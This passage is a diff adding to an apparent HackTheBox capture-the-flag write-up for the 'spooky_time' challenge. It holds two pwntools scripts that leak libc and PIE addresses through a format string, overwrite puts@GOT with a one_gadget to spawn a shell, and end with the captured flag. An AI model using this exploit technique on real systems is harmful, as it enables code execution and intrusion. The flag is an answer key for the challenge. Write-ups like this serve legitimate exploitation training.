@@ -183,4 +183,154 @@ sh.interactive()
 
 > RESULT
 
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d6990bee-61d2-4ef3-92fa-7dd469c75bce)
+
+
+12. Great! Now we need to choose the correct **one_gadget**, let's start by using the 3rd one and bruteforce the correct offset.
+
+> SCRIPT PT.3
+
+```py
+from pwn import *
+import os 
+
+os.system('clear')
+
+def start(argv=[],  *a, **kw):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2],  *a, **kw)
+    elif args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+# for remote solve
+gdbscript = '''
+init-pwndbg
+piebase
+breakrva 0x1492
+continue
+'''.format(**locals())
+
+exe = './spooky_time'
+elf = context.binary = ELF(exe, checksec=True)
+context.log_level = 'DEBUG'
+
+library = './glibc/libc.so.6'
+libc = context.binary = ELF(library, checksec=False)
+
+sh = start()
+#pause()
+
+sh.sendline('%3$p.%51$p')
+sh.recvuntil(b'than')
+sh.recvline()
+get = sh.recvlineS()
+print('GRABBED:',get)
+
+potential_libc_leak = get[:14]
+#print(potential_libc_leak)
+libc_leak = int(potential_libc_leak, 16)
+log.info('LIBC_LEAK --> %#0x', libc_leak)
+pie_base_leak = get[15:]
+pie_leak = int(pie_base_leak, 16)
+log.info('PIE_LEAK --> %#0x', pie_leak)
+#print(pie_base_leak)
+
+elf.address = pie_leak - 0x13c0 #5056 
+log.info('Calculated base address --> %#0x', elf.address)
+
+libc.address = libc_leak - 0x114a37 #1133111
+log.info('Calculated lib_base --> %#0x', libc.address)
+
+offset = 1
+one_gadget = libc.address + 0xebcf5
+payload = fmtstr_payload(offset, {elf.got['puts'] : one_gadget}) # overwrite puts@got
+sh.sendlineafter(b'time..\n\n', payload)
+
+sh.interactive()
+```
+
+14. Anyway there must be the intended solution to get the offset, but in this case i bruteforced it from number 1 to 20 and i got it correct at offset 8.
+
+> FINAL SCRIPT
+
+```py
+from pwn import *
+import os 
+
+os.system('clear')
+
+def start(argv=[],  *a, **kw):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2],  *a, **kw)
+    elif args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+# for remote solve
+gdbscript = '''
+init-pwndbg
+piebase
+breakrva 0x1492
+continue
+'''.format(**locals())
+
+exe = './spooky_time'
+elf = context.binary = ELF(exe, checksec=True)
+context.log_level = 'DEBUG'
+
+library = './glibc/libc.so.6'
+libc = context.binary = ELF(library, checksec=False)
+
+sh = start()
+#pause()
+
+sh.sendline('%3$p.%51$p')
+sh.recvuntil(b'than')
+sh.recvline()
+get = sh.recvlineS()
+print('GRABBED:',get)
+
+potential_libc_leak = get[:14]
+#print(potential_libc_leak)
+libc_leak = int(potential_libc_leak, 16)
+log.info('LIBC_LEAK --> %#0x', libc_leak)
+pie_base_leak = get[15:]
+pie_leak = int(pie_base_leak, 16)
+log.info('PIE_LEAK --> %#0x', pie_leak)
+#print(pie_base_leak)
+
+elf.address = pie_leak - 0x13c0 #5056 
+log.info('Calculated base address --> %#0x', elf.address)
+
+libc.address = libc_leak - 0x114a37 #1133111
+log.info('Calculated lib_base --> %#0x', libc.address)
+
+offset = 8
+one_gadget = libc.address + 0xebcf5 # 3rd one_gadget
+payload = fmtstr_payload(offset, {elf.got['puts'] : one_gadget}) # overwrite puts@got
+sh.sendlineafter(b'time..\n\n', payload)
+
+sh.interactive()
+```
+
+> RESULT (LOCAL)
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/97d0641f-bc74-42ce-90b5-a38c18818dc8)
+
+
+> TEST REMOTELY
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/7a8c3781-3952-4d61-95c8-beff26b5732b)
+
+
+15. Got the flag!
+
+## FLAG
+
+```
+HTB{d0ubl3_f0rm4t_5tr1ng_w1th_r3lR0}
+```
 
